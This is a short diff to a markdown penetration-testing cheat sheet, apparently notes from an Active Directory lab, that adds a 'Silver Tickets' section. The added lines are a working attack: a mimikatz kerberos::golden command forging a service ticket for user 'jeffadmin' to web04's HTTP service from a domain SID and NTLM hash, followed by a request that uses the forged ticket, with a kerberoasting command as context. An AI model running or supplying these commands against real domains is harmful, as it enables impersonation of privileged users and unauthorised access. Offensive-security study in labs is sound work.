@@ -184,6 +184,12 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 
 ## Silver Tickets
 ```bash
+#Get domain SID
+whoami /user
+#IIS service ntlm from mimikatz or somewhere
+#mimikatz silver ticket attack
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+iwr -UseDefaultCredentials http://web04
 ```
 
 
